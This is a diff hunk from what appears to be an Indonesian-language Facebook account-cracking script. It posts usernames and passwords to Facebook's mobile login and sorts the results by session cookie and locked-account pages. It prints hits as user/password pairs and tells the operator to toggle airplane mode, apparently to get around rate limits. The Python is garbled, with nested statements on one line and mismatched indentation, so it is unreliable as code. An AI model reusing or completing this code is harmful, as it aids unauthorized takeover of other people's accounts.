@@ -522,7 +522,9 @@ def log_hasil(user, pasw):
     urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
     response=par(urlPost.text, "html.parser")
     if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
-    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:if self.satua==True:print(f"{P}[CP] {self.user} | {self.pw}",end="")
+    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:
+    if self.satua==True:
+      print(f"{P}[CP] {self.user} | {self.pw}",end="")
       print(f"\r[×] Akun sesi new\n\n",end="")
       else:
         aman+=1
